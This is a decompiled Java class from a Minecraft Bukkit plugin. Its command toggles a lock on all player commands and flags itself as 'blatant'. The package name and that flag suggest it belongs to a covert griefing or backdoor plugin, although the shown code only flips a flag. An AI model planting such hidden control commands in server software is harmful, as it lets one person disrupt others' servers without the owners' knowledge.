/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.entity.Player;

public class LockcmdsCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.playerCommandsLocked) {
            plugin.playerCommandsLocked = false;
            p2.sendMessage(Settings.PREFIX("All commands are now unlocked"));
        } else {
            plugin.playerCommandsLocked = true;
            p2.sendMessage(Settings.PREFIX("All commands are now locked"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

